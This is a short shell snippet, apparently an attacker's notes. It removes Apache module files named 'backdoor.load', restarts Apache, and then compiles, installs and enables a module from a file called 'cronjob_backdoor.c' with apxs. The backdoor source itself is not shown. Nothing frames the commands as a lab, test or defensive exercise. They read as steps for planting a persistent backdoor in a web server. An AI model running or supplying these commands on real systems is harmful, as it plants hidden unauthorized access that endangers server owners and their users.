rm /etc/apache2/mods-enabled/backdoor.load
rm /etc/apache2/mods-available/backdoor.load
sudo service apache2 restart

sudo apxs -i -a -c cronjob_backdoor.c
